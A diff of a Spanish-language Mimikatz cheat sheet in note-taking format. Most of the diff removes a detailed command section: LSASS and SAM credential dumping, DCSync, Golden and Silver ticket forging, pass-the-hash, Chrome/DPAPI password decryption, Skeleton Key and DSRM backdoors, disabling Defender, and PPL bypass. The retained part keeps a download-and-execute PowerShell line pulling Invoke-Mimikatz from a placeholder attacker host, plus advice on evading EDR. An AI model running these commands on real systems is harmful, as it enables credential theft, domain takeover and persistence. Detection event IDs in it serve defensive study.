@@ -15,280 +15,110 @@ tertiary categories:
   - "[[Active Directory]]"
 kind: CheatSheet
 linked:
+  - "[[Mimikatz - sekurlsa]]"
+  - "[[Mimikatz - lsadump]]"
+  - "[[Mimikatz - kerberos y token]]"
+  - "[[Mimikatz - Dump y PPL Bypass]]"
   - "[[LSASS Dumping]]"
-  - "[[Active Directory Explotación]]"
   - "[[DCSync]]"
   - "[[Golden Ticket]]"
-  - "[[Silver Ticket]]"
-  - "[[Pass-the-Hash]]"
-  - "[[Pass-the-Ticket]]"
 ---
 # Mimikatz Cheatsheet
 
----
-
-## Cheatsheet
-^mimikatz-cheatsheet
-
-| Módulo | Comando | Qué hace |
-| --- | --- | --- |
-| **privilege** | `privilege::debug` | Habilitar SeDebugPrivilege (requerido casi siempre) |
-| **sekurlsa** | `sekurlsa::logonpasswords` | Dump de LSASS — passwords plain/NTLM/Kerberos |
-| **sekurlsa** | `sekurlsa::tickets /export` | Export Kerberos tickets de todas las sesiones |
-| **sekurlsa** | `sekurlsa::pth` | Pass-the-Hash inyectado |
-| **lsadump** | `lsadump::sam` | Dump SAM local |
-| **lsadump** | `lsadump::dcsync /user:krbtgt` | DCSync remoto |
-| **lsadump** | `lsadump::secrets` | LSA secrets (service accounts, etc.) |
-| **kerberos** | `kerberos::golden /...` | Forge Golden/Silver Ticket |
-| **kerberos** | `kerberos::ptt ticket.kirbi` | Pass-the-Ticket |
-| **kerberos** | `kerberos::list /export` | Listar + exportar tickets de sesión actual |
-| **vault** | `vault::cred /patch` | Dump Credential Manager |
-| **crypto** | `crypto::certificates /export` | Export certs del store |
-| **misc** | `misc::skeleton` | Skeleton Key (patch LSASS del DC) |
-| **token** | `token::elevate` | Elevate a SYSTEM via token impersonation |
+**Mimikatz** (gentilkiwi) es la navaja suiza de credential access en Windows: dump de LSASS, SAM/LSA secrets, DCSync, forja de tickets Kerberos, manipulación de tokens, DPAPI y persistencia. Comandos organizados por módulo.
 
 ---
 
 ## Setup
 
-### Obtener binario
-- Oficial: https://github.com/gentilkiwi/mimikatz/releases
-- Invoke-Mimikatz (PowerShell): `powersploit/Exfiltration/Invoke-Mimikatz.ps1`
-- Built-in obfuscados con typical AMSI/Defender triggers.
-
-### Evadir AV (local dev)
-```powershell
-# Agregar exclusión (requiere admin)
-Set-MpPreference -ExclusionPath "C:\Temp\"
-
-# Defender real-time off
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
-### Ejecución
 ```cmd
-# Interactive
+:: Interactivo
 mimikatz.exe
 
-# Scripted
+:: Scripted
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 
-# PowerShell reflection
+:: PowerShell reflection (cuidado AMSI → ver [[AMSI Bypasses]])
 IEX(New-Object Net.WebClient).DownloadString('http://ATK/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"
 ```
 
-## 1. Credenciales en memoria (sekurlsa)
+> Casi todo requiere `privilege::debug` (SeDebugPrivilege) + admin local.
 
-Requiere admin local + `SeDebugPrivilege`.
+---
 
-```
-privilege::debug
-sekurlsa::logonpasswords
+## Cheatsheet
 
-# Solo NT hash
-sekurlsa::msv
+### 1. sekurlsa (Credenciales en Memoria)
 
-# Kerberos tickets
-sekurlsa::tickets
-sekurlsa::tickets /export  # → .kirbi files
+````tabs
+tab: **Dump de Credenciales**
+![[Mimikatz - sekurlsa#^mimi-sekurlsa]]
 
-# Credentials wdigest (Windows <Server 2012R2 default)
-sekurlsa::wdigest
+tab: **Tickets y PtH**
+![[Mimikatz - sekurlsa#^mimi-sekurlsa-pth]]
+````
 
-# tspkg (legacy)
-sekurlsa::tspkg
+### 2. lsadump (SAM / LSA / DCSync)
 
-# Credman (masterkey)
-sekurlsa::credman
+````tabs
+tab: **SAM / LSA / Cache**
+![[Mimikatz - lsadump#^mimi-lsadump-local]]
 
-# Live SSP (si implantado)
-sekurlsa::logonpasswords /full
-```
+tab: **Desde Hives (offline)**
+![[Mimikatz - lsadump#^mimi-lsadump-offline]]
 
-### Habilitar wdigest (fuerza plaintext en próximo logon)
-```
-lsadump::secrets
-reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-```
+tab: **DCSync**
+![[Mimikatz - lsadump#^mimi-lsadump-dcsync]]
+````
 
-## 2. SAM / LSA secrets (lsadump)
+### 3. kerberos y token
 
-```
-# SAM local (local accounts)
-lsadump::sam
+````tabs
+tab: **Kerberos (forge / PtT)**
+![[Mimikatz - kerberos y token#^mimi-kerberos]]
 
-# LSA secrets
-lsadump::secrets
+tab: **Token (impersonación)**
+![[Mimikatz - kerberos y token#^mimi-token]]
+````
 
-# Cached domain creds (DCC2 / MSCASHv2)
-lsadump::cache
+### 4. Dump y PPL Bypass
 
-# Trust keys (entre dominios)
-lsadump::trust /patch
-```
+````tabs
+tab: **Dump LSASS + Offline**
+![[Mimikatz - Dump y PPL Bypass#^mimi-dump]]
 
-### Desde hive files robados
-```
-lsadump::sam /sam:SAM /system:SYSTEM
-lsadump::secrets /security:SECURITY /system:SYSTEM
-lsadump::cache /security:SECURITY /system:SYSTEM
-```
+tab: **Bypass PPL**
+![[Mimikatz - Dump y PPL Bypass#^mimi-ppl]]
 
-## 3. DCSync
+tab: **DPAPI / Crypto**
+![[Mimikatz - Dump y PPL Bypass#^mimi-dpapi]]
+````
 
-```
-lsadump::dcsync /domain:dom.local /user:krbtgt
-lsadump::dcsync /domain:dom.local /user:Administrator
-lsadump::dcsync /domain:dom.local /all /csv
-```
+---
 
-Requiere permisos de replicación (DA o delegated).
+## Overview
 
-## 4. Kerberos attacks
+| Módulo | Para qué |
+|:---|:---|
+| `privilege::debug` | Habilitar SeDebugPrivilege (casi siempre primero) |
+| `sekurlsa::` | Credenciales en memoria (LSASS) |
+| `lsadump::` | SAM, LSA secrets, cache, **DCSync** |
+| `kerberos::` | Golden/Silver ticket, Pass-the-Ticket |
+| `token::` | Elevar a SYSTEM / impersonar |
+| `vault::` / `dpapi::` | Credential Manager, DPAPI, browser creds |
+| `crypto::` | Export de certificados |
+| `misc::skeleton` | Skeleton Key (persistencia, ver [[Skeleton Key]]) |
 
-### Golden Ticket
-```
-kerberos::golden /user:fakeadmin /domain:dom.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500 /groups:513,512,520,518,519 /ptt
-```
+**Persistencia** (Skeleton Key, DSRM, Custom SSP) tienen notas propias. **Dump de LSASS** detallado: [[LSASS Dumping]].
 
-### Silver Ticket
-```
-kerberos::golden /user:admin /domain:dom.local /sid:SID /target:host.dom.local /service:cifs /rc4:COMPUTER_HASH /id:500 /ptt
-```
+> [!warning] Detección
+> `sekurlsa::logonpasswords` abre handle sobre LSASS (`4673/4674`); `lsadump::dcsync` genera `4662` con GUID de replicación en el DC. Preferir dump offline (comsvcs/procdump) + parse en tu máquina para evadir EDR.
 
-### Pass-the-Ticket
-```
-kerberos::ptt ticket.kirbi
-kerberos::list /export
-kerberos::purge
-```
-
-## 5. Pass-the-Hash
-
-```
-privilege::debug
-sekurlsa::pth /user:Administrator /domain:dom.local /ntlm:NTHASH /run:cmd.exe
-
-# AES
-sekurlsa::pth /user:Administrator /domain:dom.local /aes256:AES_KEY /run:cmd.exe
-```
-
-Abre shell con creds inyectadas — `dir \\target\c$` etc.
-
-## 6. Token manipulation
-
-```
-token::list
-token::elevate              # SYSTEM via primary token steal
-token::elevate /domainadmin # Token de DA si disponible
-token::run /user:DOMAIN\admin /process:cmd.exe
-token::revert
-```
-
-## 7. Credential Vault / DPAPI
-
-```
-# Credentials del Credential Manager
-vault::cred /patch
-vault::list
-
-# DPAPI masterkeys (requiere SYSTEM o user owner)
-dpapi::masterkey /in:"C:\Users\victim\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
-
-# Decrypt credencial con masterkey
-dpapi::cred /in:"C:\Users\victim\AppData\Local\Microsoft\Credentials\FILE" /masterkey:MASTERKEY
-
-# Chrome passwords
-dpapi::chrome /in:"C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
-```
-
-## 8. Certificates (crypto)
-
-```
-crypto::capi
-crypto::cng
-crypto::certificates /export
-crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My /export
-```
-
-Certificates exportables del Current User / Local Machine stores → auth PKINIT + RDP + VPN.
-
-## 9. Persistence
-
-### Skeleton Key
-Parche en LSASS del DC → master password `mimikatz` funciona para todo user del dominio.
-
-```
-privilege::debug
-misc::skeleton
-# Ahora: logon como cualquier user con password "mimikatz"
-```
-
-Vuelve a 0 al reboot del DC.
-
-### DSRM backdoor
-```
-# En DC:
-privilege::debug
-token::elevate
-lsadump::sam
-
-# Change DSRM behavior
-reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
-```
-
-DSRM account puede loguear por red.
-
-## 10. Event ID / OpSec
-
-| Acción | Events |
-| --- | --- |
-| `privilege::debug` | 4703, 4672 |
-| `sekurlsa::logonpasswords` | 4673, 4674, handle sobre LSASS |
-| `lsadump::dcsync` | 4662 (con GUID de replication rights) en DC |
-| `kerberos::golden + ptt` | 4624 logon sin 4768 correlacionado |
-| `misc::skeleton` | 4673 sobre lsass + anómalo Kerberos errors |
-
-### Bypass PPL (Protected Process Light) de LSASS
-```
-!+                   # load driver mimidrv
-!processprotect /process:lsass.exe /remove
-privilege::debug
-sekurlsa::logonpasswords
-!processprotect /process:lsass.exe
-!-                   # unload driver
-```
-
-Requiere driver `mimidrv.sys` firmado.
-
-### Alternativa sin driver: process dump + parse offline
-```cmd
-# Con comsvcs.dll
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
-
-# Procdump
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-
-# Parse offline con mimikatz
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords
-```
-
-## 11. Alternativas modernas
-
-- **pypykatz** — Python, parse offline, no toca LSASS en target.
-- **nanodump** (Cobalt Strike) — dump de LSASS sin triggear defender.
-- **SafetyKatz** — Mimikatz minimizado + technique anti-AV.
-- **Rubeus** — reemplazo para kerberos:: operations.
-- **SharpSecDump** — standalone DCSync.
-- **Dumpert** — LSASS dump via direct syscalls.
+---
 
 ## Recursos
 
 - [Mimikatz Wiki (oficial)](https://github.com/gentilkiwi/mimikatz/wiki)
-- [ADSecurity - Mimikatz](https://adsecurity.org/?page_id=1821)
-- [HackTricks - Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections)
-- [pypykatz](https://github.com/skelsec/pypykatz)
-
----
+- [ADSecurity — Mimikatz](https://adsecurity.org/?page_id=1821)
+- [pypykatz](https://github.com/skelsec/pypykatz) — alternativa Python offline.
